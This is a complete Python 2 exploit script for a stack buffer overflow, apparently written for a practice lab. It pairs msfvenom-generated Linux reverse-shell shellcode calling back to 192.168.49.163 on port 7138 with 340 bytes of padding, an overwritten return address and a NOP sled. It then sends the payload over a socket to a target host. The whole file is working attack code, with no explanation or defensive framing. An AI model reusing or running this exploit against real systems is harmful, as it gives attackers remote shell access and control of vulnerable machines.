#!/usr/bin/python
import socket

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.163 LPORT=7138 -f py -b "\x00" -e x86/shikata_ga_ni

buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += b"\xa8\x31\xa3\x68\x02\x00\x1b\xe2\x89\xe1\xb0\x66\x50"
buf += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += b"\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += b"\x0b\xcd\x80"

padding = "A" * 340
eip = "\x03\x15\x10\x41"
nops = "\x90" * 8

buffer =  padding + eip + nops + buf 

try:
    print "\n Sending Malicious Code to Buffer..."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.163.129", 7138))
    s.send(buffer)
    s.close()
    print "\nBuffer Overflowed"

except:
    print "Could not connect to application"
